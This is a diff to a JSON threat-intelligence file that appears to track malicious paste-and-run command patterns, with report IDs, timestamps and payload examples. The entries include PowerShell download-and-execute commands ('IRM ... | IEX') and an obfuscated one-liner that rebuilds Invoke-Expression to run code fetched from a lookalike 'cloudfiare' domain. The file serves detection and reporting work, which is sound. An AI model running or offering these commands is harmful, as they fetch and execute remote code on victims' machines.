@@ -777,21 +777,6 @@
     ]
   },
   {
-    "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-17T13:50:59.134000+00:00",
-    "LastSeen": "2026-11-19T01:47:35.719000+00:00",
-    "ReportIds": [
-      "cmwkr312l1fmb0omljm9yarua",
-      "cmwlzx7181r4v0omlc0wtmgup",
-      "cmwmw4g2q1ulx0omljr4g3cvy"
-    ],
-    "PayloadExamples": [
-      "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
-    ]
-  },
-  {
     "Pattern": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare.io/u)\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 3,
@@ -832,6 +817,20 @@
     ],
     "PayloadExamples": [
       "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
+    ]
+  },
+  {
+    "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-18T10:46:09.706000+00:00",
+    "LastSeen": "2026-11-19T01:47:35.719000+00:00",
+    "ReportIds": [
+      "cmwlzx7181r4v0omlc0wtmgup",
+      "cmwmw4g2q1ulx0omljr4g3cvy"
+    ],
+    "PayloadExamples": [
+      "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
     ]
   },
   {
